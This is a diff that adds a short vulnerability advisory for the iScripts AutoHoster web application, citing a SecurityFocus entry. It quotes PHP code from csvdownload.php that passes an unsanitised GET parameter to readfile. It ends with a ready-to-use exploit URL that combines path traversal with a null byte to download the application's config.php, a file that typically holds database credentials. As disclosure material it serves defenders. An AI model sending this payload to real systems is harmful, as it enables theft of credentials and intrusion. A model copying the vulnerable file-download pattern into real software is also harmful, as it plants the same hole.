@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/64377/info
+       
+iScripts AutoHoster is prone to multiple security vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+       
+An attacker can exploit these vulnerabilities to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database, to execute arbitrary commands or script code in the context of the application, and obtain sensitive information that may aid in further attacks.
+       
+/support/admin/csvdownload.php
+  $filename="../csvfiles/".addslashes($_GET["id"]).".txt";
+  header('Content-Description: File Transfer'); 
+  header('Content-Type: application/force-download'); 
+  header('Content-Length: ' . filesize($filename)); 
+  header('Content-Disposition: attachment; filename=' . basename($filename)); 
+  readfile($filename);
+[+] Exploit : /support/admin/csvdownload.php?id=../../includes/config.php%00
